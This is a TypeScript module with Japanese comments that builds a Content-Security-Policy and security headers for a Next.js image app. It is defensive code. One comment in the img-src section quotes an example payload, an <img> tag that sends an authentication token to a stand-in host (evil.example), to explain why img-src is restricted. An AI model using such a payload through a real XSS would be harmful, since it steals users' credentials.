/**
 * Content-Security-Policy の組み立て。
 *
 * next.config.ts にベタ書きしていると変更をテストで守れないため、ここに切り出している。
 * 変更したら test/lib/csp.test.ts も併せて確認すること。
 *
 * 注意: Next App Router はハイドレーション等でインラインスクリプト/スタイルを使うため
 * script/style は 'unsafe-inline' を許容している（nonce ベースの厳格化は静的プリレンダリングを
 * 全て動的化するコストがあるため見送り）。その代わり **持ち出し経路** を絞ることを重視する。
 */

/** API オリジン（画像の redirect 元にもなる） */
const API_ORIGIN = 'https://image-palace-api.fly.dev'

/**
 * 画像の実体配信元。
 *
 * 画像は API の `/rails/active_storage/blobs/redirect/...` が R2 の presigned URL へ 302 する。
 * CSP はリダイレクト後の URL も検査するため、**API と R2 の両方**を許可する必要がある。
 *
 * CDN_BASE_URL を有効化したら、その配信ホスト（例: https://cdn.example.com）をここに追加する。
 * 順序を誤ると画像が CSP でブロックされるため、CDN 切り替えより先にこの更新をデプロイすること。
 */
const IMAGE_ORIGINS = [API_ORIGIN, 'https://*.r2.cloudflarestorage.com']

export function buildContentSecurityPolicy(): string {
  return [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://static.cloudflareinsights.com https://www.googletagmanager.com",
    "style-src 'self' 'unsafe-inline'",
    // 裸の https: を許可すると XSS 時に <img src="https://evil.example/?t=トークン"> で
    // 認証トークンを持ち出せてしまう。外部画像ホストは実際に使っていないため自ホストに限定する。
    `img-src 'self' data: blob: ${IMAGE_ORIGINS.join(' ')}`,
    "font-src 'self' data:",
    `connect-src 'self' ${API_ORIGIN} https://*.sentry.io https://cloudflareinsights.com https://*.google-analytics.com https://*.analytics.google.com`,
    // default-src 'self' へのフォールバックだと blob: の Worker が壊れるため明示する
    "worker-src 'self' blob:",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'",
  ].join('; ')
}

export const securityHeaders = [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
]
